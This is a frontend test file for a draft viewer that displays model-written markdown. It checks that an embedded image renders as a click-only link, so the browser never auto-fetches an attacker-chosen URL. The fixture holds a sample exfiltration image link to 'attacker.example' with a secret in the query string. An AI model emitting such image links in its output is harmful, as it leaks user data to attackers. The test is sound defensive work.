/**
 * GOO-636 (FC-1): drafts are model-written markdown. An image in a draft must
 * never render as an <img>, or the browser fetches an attacker-chosen URL as
 * soon as the draft opens.
 */
import { describe, expect, it, vi } from 'vitest';
import { render, screen } from '@/test/test-utils';
import { DraftViewer } from '../DraftViewer';
import type { Draft } from '@/services/projectService';

vi.mock('@/hooks/useBackendCapabilities', () => ({
  useBackendCapabilities: () => ({ draftClaims: false, draftRelease: false }),
}));
vi.mock('@/hooks/useAuth', () => ({ useAuth: () => ({ user: { id: 'me' } }) }));
vi.mock('@/services/researchEngineService', () => ({
  listProjectRoles: vi.fn().mockResolvedValue([]),
}));
vi.mock('@/services/projectService', () => ({
  projectService: {
    getDraftRelease: vi.fn().mockResolvedValue(null),
    promoteDraft: vi.fn(),
    listManuscriptReleases: vi.fn().mockResolvedValue({ releases: [] }),
  },
}));

const draft: Draft = {
  id: 'draft-1',
  project_id: 'project-1',
  version: 1,
  title: 'Review',
  content:
    'Findings below.\n\n![chart](https://attacker.example/x.png?q=secret)',
  themes: [],
  word_count: 3,
  citation_count: 0,
  is_current: true,
  created_at: '2026-09-30T00:00:00Z',
  content_hash: 'a'.repeat(64),
};

describe('DraftViewer images', () => {
  it('renders a draft image as a click-only link, never an <img>', () => {
    const { container } = render(
      <DraftViewer draft={draft} projectId="project-1" />
    );
    expect(container.querySelector('img')).toBeNull();
    const link = screen.getByRole('link', { name: '[image: chart]' });
    expect(link).toHaveAttribute(
      'href',
      'https://attacker.example/x.png?q=secret'
    );
  });
});
